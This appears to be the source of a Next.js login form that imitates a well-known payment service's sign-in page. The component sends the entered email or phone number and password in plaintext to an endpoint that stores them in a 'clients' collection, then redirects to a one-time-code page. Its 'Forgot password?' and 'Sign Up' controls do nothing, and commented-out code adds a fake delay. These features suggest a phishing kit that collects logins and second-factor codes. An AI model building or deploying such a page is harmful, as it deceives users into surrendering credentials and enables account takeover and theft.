"use client";
import { LuLogIn } from "react-icons/lu";
import { useState } from "react";
import { supabase } from "@/lib/supabaseClient";

import { useRouter } from "next/navigation";
import LoadingSpinner from "../LoadinSpinner";
import Image from "next/image";

function LoginForm() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const router = useRouter();

  async function handleSubmit(e) {
    e.preventDefault();
    // const { error } = await supabase
    //   .from("clients")
    //   .insert({ email, password });
    // if (error) {
    //   // Toast Message On Development
    //   console.log(error.message);
    // } else {
    //   setLoading(true);
    //   await fakeDelay(3000);
    //   setLoading(false);
    //   router.push("/otp");
    //   setEmail("");
    //   setPassword("");
    // }
    addClient();
  }
  async function addClient() {
    setLoading(true);
    try {
      const res = await fetch("/api/insert-client", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          databaseId: "6751f99600393a1261d8",
          collectionId: "6751f9b6002c3bfd6493",
          data: { email: email, password: password },
        }),
      });
      const results = await res.json();
      router.push("/otp");
      console.log("Client Details Inserted Successfully", results.document);
    } catch (error) {
      console.log(error.message);
    } finally {
      setLoading(false);
    }
  }
  return (
    <form
      onSubmit={(e) => handleSubmit(e)}
      className="flex flex-col md:px-7 px-4 w-full  gap-3 "
    >
      {loading && <LoadingSpinner />}
      <div className="flex flex-col relative gap-3   py-2">
        <div className="flex flex-col">
          <input
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            type="text"
            placeholder=""
            required
            className="peer text-gray-500 font-semibold px-3 border-2 border-gray-300 outline-none focus:ring-4 focus:ring-blue-600 focus:border-buttonTextColor  py-5 text-xl transition duration-300 ease-in-out rounded-md "
          />
          <label
            htmlFor="email"
            className="absolute left-3 text-gray-500 font-semibold text-base top-2 select-none sm:text-sm transition-all duration-300 ease-in-out peer-placeholder-shown:top-4 peer-placeholder-shown:text-lg peer-placeholder-shown:text-gray-500 peer-placeholder-shown:font-semibold peer-focus:top-2 peer-focus:text-sm "
          >
            Email or phone number
          </label>
        </div>
      </div>
      <div className="flex flex-col relative gap-3   py-2">
        <div className="flex flex-col">
          <input
            id="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            type="password"
            required
            placeholder=""
            className="peer text-xl text-gray-500 font-semibold px-3 border-2 border-gray-300 outline-none focus:ring-4 focus:ring-blue-600 focus:border-buttonTextColor  py-5 transition duration-300 ease-in-out rounded-md "
          />
          <label
            htmlFor="password"
            className="absolute left-3 top-2 text-gray-500 font-semibold text-base select-none  sm:text-sm transition-all duration-300 ease-in-out peer-placeholder-shown:top-4 peer-placeholder-shown:text-lg peer-placeholder-shown:text-gray-500 peer-placeholder-shown:font-semibold peer-focus:top-2 peer-focus:text-sm "
          >
            Password
          </label>
        </div>
      </div>
      <div>
        <p className="text-xl text-[#0070E0] font-bold inline-block font-sans px-2  active:ring-4 active:ring-offset-4 active:ring-[#0070E0] rounded-md text-start cursor-default hover:text-[#0070E0]">
          Forgot password?
        </p>
      </div>

      <div className="w-full md:w-96 flex flex-col gap-3 ">
        <button className="text-base font-bold bg-buttonTextColor  border-2 border-buttonTextColor/45 text-white w-full rounded-3xl py-3 flex justify-center items-center font-sans hover:bg-buttonTextColor/90">
          {loading ? "submitting..." : "Login"}
        </button>
        <button className="text-base w-full font-bold bg-white  border-2 border-gray-700 text-gray-700  rounded-3xl py-3 flex justify-center gap-1 items-center font-sans hover:text-buttonTextColor/90 hover:border-buttonTextColor/90">
          <Image
            src={"/otpLoginSms.png"}
            width={100}
            height={100}
            alt="login sms image"
            className="h-6 w-4"
          />
          <span> Log in with a one-time code</span>
        </button>
      </div>
      <div className="flex mt-5 items-center">
        <p className="border-b h-1 w-full  border-gray-400 "></p>
        <p className="px-1">or</p>
        <p className=" h-1 w-full border-b border-gray-400"></p>
      </div>
      <div className="w-full md:w-96">
        <button className="text-base w-full font-bold bg-white  border-2 border-gray-700 text-gray-700  rounded-3xl py-3 flex justify-center items-center font-sans hover:text-buttonTextColor/90 hover:border-buttonTextColor/90">
          Sign Up
        </button>
      </div>
    </form>
  );
}

export default LoginForm;
